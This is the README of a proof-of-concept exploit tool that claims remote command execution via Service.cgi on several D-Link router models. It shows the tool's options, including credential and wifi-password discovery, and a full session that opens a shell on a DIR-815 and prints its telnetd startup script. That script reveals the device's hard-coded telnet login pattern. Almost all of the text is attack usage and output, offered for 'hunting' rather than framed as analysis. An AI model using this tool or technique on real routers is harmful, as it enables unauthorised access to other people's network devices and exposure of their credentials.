# dlink_shell_poc
Dlink shell PoC

Tested on D-Link 815 Version A 1.3

Works with:
- DIR-110
- DIR-412
- DIR-600
- DIR-615
- DIR-645 https://vuldb.com/?id.7843 (will add this in later... probably)
- DIR-815

## Example ##
```
root@kali:~# ./dlink_shell_poc.py -h
usage: dlink_shell_poc.py [-h] [-p PASSWORD] -u URL [-x]

D-Link Service.cgi RCE

optional arguments:
  -h, --help            show this help message and exit
  -p PASSWORD, --password PASSWORD
                        Password for the router. If not supplied then will use
                        blank password.
  -u URL, --url URL     [Required] URL for router (i.e. http://10.1.1.1:8080)
  -x, --attempt-exploit
                        If flag is set, will attempt CWE-200. If that fails,
                        then will attempt to discover wifi password and use
                        it.

root@kali:~# ./dlink_shell_poc.py -u http://10.0.0.1:8080
+--------------------------------------------------------------------------------+
| Welcome to D-Link Shell                                                        |
+--------------------------------------------------------------------------------+
| This is a limited shell that exploits piss poor programming.  I created this   |
| to give you a comfort zone and to emulate a real shell environment.  You will  |
| be limited to basic busybox commands.  Good luck and happy hunting.            |
|                                                                                |
| To quit type 'gtfo'                                                            |
+--------------------------------------------------------------------------------+

DIR-815# ls /etc/init0.d/
rcS
S80telnetd.sh
S65ddnsd.sh
S52wlan.sh
S51wlan.sh
S42pthrough.sh
S41inf.sh
S41event.sh
S41autowanv6.sh
S41autowan.sh
S40gpioevent.sh
S40event.sh
S21layout.sh

DIR-815# /bin/cat /etc/init0.d/S80telnetd.sh
#!/bin/sh
echo [$0]: $1 ... > /dev/console
if [ "$1" = "start" ]; then
	if [ -f "/usr/sbin/login" ]; then
		image_sign=`cat /etc/config/image_sign`
		telnetd -l /usr/sbin/login -u Alphanetworks:$image_sign -i br0 &
	else
		telnetd &
	fi
else
	killall telnetd
fi

DIR-815# gtfo
root@kali:~#
```

